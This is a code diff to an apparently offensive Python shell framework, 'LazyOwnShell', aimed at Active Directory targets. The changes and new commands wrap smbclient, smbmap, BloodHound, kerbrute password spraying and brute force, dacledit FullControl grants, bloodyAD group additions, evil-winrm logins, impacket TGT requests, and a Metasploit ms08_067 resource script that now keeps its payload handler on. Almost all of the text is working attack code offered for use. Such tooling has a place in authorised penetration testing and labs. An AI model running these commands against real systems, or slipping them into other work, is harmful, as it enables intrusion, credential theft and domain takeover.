@@ -2231,14 +2231,37 @@ class LazyOwnShell(Cmd):
 
         rhost = self.params["rhost"]
         lhost = self.params["lhost"]
-        if not rhost or not not lhost:
-            print_error("rhost and lhost must be set")
+        path_cred = "sessions/credentials.txt"
+        url = self.params["url"]
+        domain = get_domain(url)
+        if not check_rhost(rhost):
             return
 
+        if not check_lhost(lhost):
+            return
+
+            
+
+        if not os.path.exists(path_cred):
+            print_error("you need credentials.txt exec: createcredentials admin:admin")
+            return
+        with open(path_cred, "r") as file:
+            for file_line in file:
+                params = file_line.split(":")
+                user = params[0]
+                passwd = params[1].replace("\n", "")
+                command = f"smbclient -L //{domain}/{line} -U '{domain}\\\\{user}'"
+                copy2clip(passwd)
+                print_msg(command)
+                os.system(command)
+                return
+        
         if line:
             print_msg(f"Try .. smbclient -N \\\\{rhost}\\\\{line} {RESET}")
             os.system(f"smbclient -N \\\\\\\\{rhost}\\\\{line}")
             return
+        
+        
         print_msg(f"Perform this command: smbclient -N -L \\\\{rhost}\\ {RESET}")
         os.system(f"smbclient -N -L \\\\{rhost}\\")
         print_msg(
@@ -2259,15 +2282,21 @@ class LazyOwnShell(Cmd):
 
         :param line: Options or share name to use with `smbmap`. If not provided, uses a default user to list shares.
         :returns: None"""
+        
         rhost = self.params["rhost"]
         lhost = self.params["lhost"]
-        if not rhost or not not lhost:
-            print_error("rhost and lhost must be set")
+        
+        if not check_rhost(rhost):
             return
+
+        if not check_lhost(lhost):
+            return
+
         if not line:
             print_msg(f"Try... smbmap -H {rhost} -u 'deefbeef'")
             os.system(f"smbmap -H {rhost} -u 'deefbeef'")
             return
+
         print_msg(f"Try... smbmap -H {rhost} -R {line}")
         os.system(f"smbmap -H {rhost} -R {line}")
         print_msg(
@@ -3047,6 +3076,8 @@ class LazyOwnShell(Cmd):
         Ensure you have a file `sessions/credentials.txt` with the format `user:password`, where each line contains credentials for enumeration.
         """
         rhost = self.params["rhost"]
+        url = self.params["url"]
+        domain = get_domain(url)
 
         if check_rhost(rhost):
             path_cred = "sessions/credentials.txt"
@@ -3055,18 +3086,17 @@ class LazyOwnShell(Cmd):
                     "You must have file sessions/credentials.txt with this format: user:password more help createcredentials"
                 )
                 return
-            # Abre el archivo en modo de lectura
             with open(path_cred, "r") as file:
-                # Recorre cada línea del archivo
                 for file_line in file:
                     params = file_line.split(":")
                     user = params[0]
                     passwd = params[1].replace("\n", "")
+                    dc = input("enter DC subdomain example dc01: ")
                     print_msg(
-                        f"    {GREEN}[*] Try... bloodhound-python -c All -u '{user}' -p '{passwd}' -ns {rhost}"
+                        f"    {GREEN}[*] Try... bloodhound-python -u '{user}' -p '{passwd}' -d '{domain}' -gc '{dc}.{domain}' -ns {rhost} -c all --zip"
                     )
                     os.system(
-                        f"cd sessions && bloodhound-python -c All -u '{user}' -p '{passwd}' -ns {rhost}"
+                        f"cd sessions && bloodhound-python -u '{user}' -p '{passwd}' -d '{domain}' -gc 'dc01.{domain}' -ns {rhost} -c all --zip"
                     )
         return
 
@@ -8011,7 +8041,7 @@ class LazyOwnShell(Cmd):
 
         lhost = self.params["lhost"]
         lport = self.params["lport"]
-        passwd_file = self.params.get("wordlist", None)
+        passwd_file = self.params["wordlist"]
         file = "sessions/meta.rc" 
         def find_tgts(subnet):
             nmap_proc = NmapProcess(subnet, options="-p 445 --open")
@@ -8020,7 +8050,7 @@ class LazyOwnShell(Cmd):
 
             hosts = []
             for host in nmap_report.hosts:
-                if host.is_up() and host.has_tcp(445) and host.get_tcp(445).state == "open":
+                if host.is_up() and 'tcp' in host.services and 445 in host.services['tcp'] and host.services['tcp'][445].state == "open":
                     print_msg(f"[+] Found Target Host: {host.address}")
                     hosts.append(host.address)
             return hosts
@@ -8031,7 +8061,7 @@ class LazyOwnShell(Cmd):
             config_file.write(f'set LPORT {str(lport)}\n')
             config_file.write(f'set LHOST {lhost}\n')
             config_file.write('exploit -j -z\n')
-            config_file.write('setg DisablePayloadHandler 1\n')
+            config_file.write('setg DisablePayloadHandler 0\n')
 
         def conficker_exploit(config_file, host, lhost, lport):
             config_file.write('use exploit/windows/smb/ms08_067_netapi\n')
@@ -9366,7 +9396,244 @@ class LazyOwnShell(Cmd):
         generate_certificates()
         os.system("mv *.pem sessions")
         return
+
+    def do_kerbrute(self, line):
+        """
+        Executes the Kerbrute tool to enumerate user accounts against a specified target domain controller.
+
+        This function performs the following actions:
+        1. Retrieves necessary parameters such as the target URL and remote host (rhost).
+        2. Determines the domain based on the provided URL.
+        3. Validates the remote host address.
+        4. Constructs and executes the Kerbrute command to enumerate user accounts, saving the results in the sessions/users.txt file.
+
+        Parameters:
+        line (str): Specify 'pass' to use credentials from 'credentials.txt' for password spraying, 'brute' to brute force using 'users.txt' and the RockYou wordlist, or leave empty for default behavior.
+
+        Returns:
+        None
+
+        Example:
+        To enumerate user accounts using Kerbrute, ensure Kerbrute is in your path, 
+        then run this function to perform the enumeration.
+
+        Note:
+        - The function assumes that the Kerbrute binary (kerbrute_linux_amd64) is present in the system's PATH.
+        - The file sessions/users.txt should exist and contain the list of usernames to enumerate.
+        """
+        if not is_binary_present("kerbrute_linux_amd64"):
+            print_warn("Attemp to install kerbrute...")
+            cmd = "go get github.com/ropnop/kerbrute"
+            os.system(cmd)
+
+        url = self.params["url"]
+        rhost = self.params["rhost"]
+        path = os.getcwd()
+        users_txt = f"{path}/sessions/users.txt"
+        domain = get_domain(url)
         
+        if not check_rhost(rhost):
+            return
+
+        path_cred = "sessions/credentials.txt"
+        
+        if line == "pass":
+            if not os.path.exists(path_cred):
+                print_error("you need credentials.txt exec: createcredentials admin:admin")
+                return
+            with open(path_cred, "r") as file:
+                for file_line in file:
+                    params = file_line.split(":")
+                    user = params[0]
+                    passwd = params[1].replace("\n", "")
+                    command = f"kerbrute_linux_amd64 passwordspray --dc {rhost} -d {domain} -t 20 -v {users_txt} '{passwd}'"
+                    print_msg(command)
+                    os.system(command)
+
+        if line == "brute":
+            if not os.path.exists(users_txt):
+                print_error(f"you need {users_txt} exec: sh nano sessions/users.txt, to create first attemp use cewl")
+                return
+            wordlist = self.params["wordlist"]
+            with open(users_txt, "r") as file:
+                for user in file:
+                    user = user.strip()
+                    command = f"kerbrute_linux_amd64 bruteuser --dc {rhost} -d {domain} -t 20 -v {wordlist} {user}"
+                    print_msg(command)
+                    os.system(command)                
+        else:
+            command = f"kerbrute_linux_amd64 userenum --dc {rhost} -d {domain} -t 20 -v {users_txt} "
+            print_msg(command)
+            os.system(command)
+        return
+
+    def do_dacledit(self, line):
+        
+        url = self.params["url"]
+        rhost = self.params["rhost"]
+        path = os.getcwd()
+        users_txt = f"{path}/sessions/users.txt"
+        domain = get_domain(url)
+        ca = domain.split(".")
+        base_domain = ca[0].upper()
+        ext = ca[1].upper()
+        if not check_rhost(rhost):
+            return
+        if not line:
+            line = input("    [!] Enter OU= example MARKETING DIGITAL: ")
+
+        if not os.path.exists(users_txt):
+            print_error(f"you need {users_txt} exec: sh nano sessions/users.txt, to create first attemp use cewl")
+            return
+
+        with open(users_txt, "r") as file:
+            users = [user.strip() for user in file]
+
+        print_msg("Select a user by number to execute the command for a specific user, or press Enter to execute for all users:")
+        for idx, user in enumerate(users, start=1):
+            print_warn(f"{idx}. {user}")
+
+        selection = input("Enter the number of the user you want to select: ").strip()
+
+        if selection.isdigit():
+            user = users[int(selection) - 1]
+            command = command = f"export KRB5CCNAME=/tmp/{user}.ccache ; dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal '{user}' -target-dn 'OU={line},DC={base_domain},DC={ext}' '{domain}/{user}' -k -no-pass -dc-ip {rhost}"
+            print_msg(command)
+            os.system(command)
+        else:
+            for user in users:
+                command = f"export KRB5CCNAME=/tmp/{user}.ccache ; dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal '{user}' -target-dn 'OU={line},DC={base_domain},DC={ext}' '{domain}/{user}' -k -no-pass -dc-ip {rhost}"
+                print_msg(command)
+                os.system(command) 
+               
+        return
+    def do_bloodyAD(self, line):
+        
+        url = self.params["url"]
+        rhost = self.params["rhost"]
+        path = os.getcwd()
+        users_txt = f"{path}/sessions/users.txt"
+        domain = get_domain(url)
+        ca = domain.split(".")
+        base_domain = ca[0].upper()
+        ext = ca[1].upper()
+        if not check_rhost(rhost):
+            return
+        
+        cn = input("    [!] Enter CN= example CHIEFS MARKETING: ")
+
+        if not os.path.exists(users_txt):
+            print_error(f"you need {users_txt} exec: sh nano sessions/users.txt, to create first attemp use cewl")
+            return
+ 
+        with open(users_txt, "r") as file:
+            users = [user.strip() for user in file]
+
+        print_msg("Select a user by number to execute the command for a specific user, or press Enter to execute for all users:")
+        for idx, user in enumerate(users, start=1):
+            print_warn(f"{idx}. {user}")
+
+        selection = input("Enter the number of the user you want to select: ").strip()
+
+        if selection.isdigit():
+            selected_user = users[int(selection) - 1]
+            command = f"export KRB5CCNAME=/tmp/{selected_user}.ccache ; bloodyAD.py --host dc01.{domain} --dc-ip {rhost} -u {selected_user} -k -d {domain} add groupMember \"CN={cn},CN=USERS,DC={base_domain},DC={ext}\" {selected_user}"
+            print_msg(command)
+            os.system(command)
+        else:
+            for user in users:
+                command = f"export KRB5CCNAME=/tmp/{user}.ccache ; bloodyAD.py --host dc01.{domain} --dc-ip {rhost} -u {user} -k -d {domain} add groupMember \"CN={cn},CN=USERS,DC={base_domain},DC={ext}\" {user}"
+                print_msg(command)
+                os.system(command) 
+
+    def do_evilwinrm(self, line):
+        """
+        Executes the Evil-WinRM tool to attempt authentication against the specified target.
+
+        This function performs the following actions:
+        1. Checks if the provided target host (`rhost`) is valid.
+        2. If the `line` argument is "pass", it reads credentials from the `credentials.txt` file and attempts authentication for each user-password pair using Evil-WinRM.
+        3. If `line` is not "pass", it prints an error message indicating the correct usage.
+
+        Parameters:
+        line (str): A command argument to determine the action. 
+                    If "pass", the function reads credentials from the `credentials.txt` file and attempts to authenticate.
+                    If not "pass", it prints an error message with usage instructions.
+
+        Returns:
+        None
+        """        
+        rhost = self.params["rhost"]
+        path = os.getcwd()
+        users_txt = f"{path}/sessions/users.txt"
+        
+        if not check_rhost(rhost):
+            return
+
+        path_cred = "sessions/credentials.txt"        
+        
+
+        if not os.path.exists(path_cred):
+            print_error("you need credentials.txt exec: createcredentials admin:admin")
+            return
+        with open(path_cred, "r") as file:
+            for file_line in file:
+                params = file_line.split(":")
+                user = params[0]
+                passwd = params[1].replace("\n", "")
+                command = f"evil-winrm -i {rhost} -u {user} -p '{passwd}'"
+                print_msg(command)
+                os.system(command)
+        return
+
+    def do_getTGT(self, line):
+        """
+        Requests a Ticket Granting Ticket (TGT) using the Impacket tool with provided credentials.
+
+        This function performs the following actions:
+        1. Checks if the provided target host (`rhost`) is valid.
+        2. Reads credentials from the `credentials.txt` file.
+        3. Uses each credential (username and password) to request a TGT with the Impacket tool.
+        4. Constructs and executes the Impacket command to obtain a TGT for each set of credentials.
+
+        Parameters:
+        line (str): A command line argument, not used in this implementation.
+
+        Returns:
+        None
+        """
+        url = self.params["url"]
+        domain = get_domain(url)
+        rhost = self.params["rhost"]
+        path = os.getcwd()
+        users_txt = f"{path}/sessions/users.txt"
+        
+        if not check_rhost(rhost):
+            return
+
+        path_cred = "sessions/credentials.txt"        
+       
+        if not os.path.exists(path_cred):
+            print_error("you need credentials.txt exec: createcredentials admin:admin")
+            return
+        with open(path_cred, "r") as file:
+            for file_line in file:
+                params = file_line.split(":")
+                if not line:
+                    user = params[0]
+                else:
+                    user = line
+                passwd = params[1].replace("\n", "")
+                tmp = f"/tmp/{user}.ccache"
+                command = f"export KRB5CCNAME={tmp} ; sudo impacket-getTGT -dc-ip {rhost} '{domain}/{user}:{passwd}'"
+                print_msg(command)
+                os.system(command)
+                cmd = f"mv {user}.ccache {tmp}"
+                print_msg(cmd)
+                os.system(cmd)
+        
+        return
+
 if __name__ == "__main__":
     p = LazyOwnShell()
     p.onecmd("p")
